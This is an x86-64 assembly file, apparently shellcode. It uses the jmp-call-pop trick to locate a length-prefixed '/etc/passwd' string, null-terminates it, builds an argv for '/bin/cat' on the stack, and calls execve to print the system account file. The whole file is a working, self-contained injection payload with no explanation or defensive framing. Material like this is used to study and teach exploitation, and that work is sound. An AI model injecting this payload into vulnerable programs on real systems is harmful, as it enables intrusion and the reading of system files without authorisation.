        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rax
        xor rdx, rdx
        lea rsi, [rax+1]
        movzx rcx, byte ptr [rax]
        add rcx, rsi
        mov [rcx], dl
        push rdx
        mov rax, 0x7461632f6e69622f  /* "/bin/cat" */
        push rax
        mov rdi, rsp
        push rdx
        push rsi
        push rdi
        mov rsi, rsp
        push 59                      /* execve */
        pop rax
        syscall
caller:
        call callee
pstring:
        .byte 11
        .ascii "/etc/passwd"
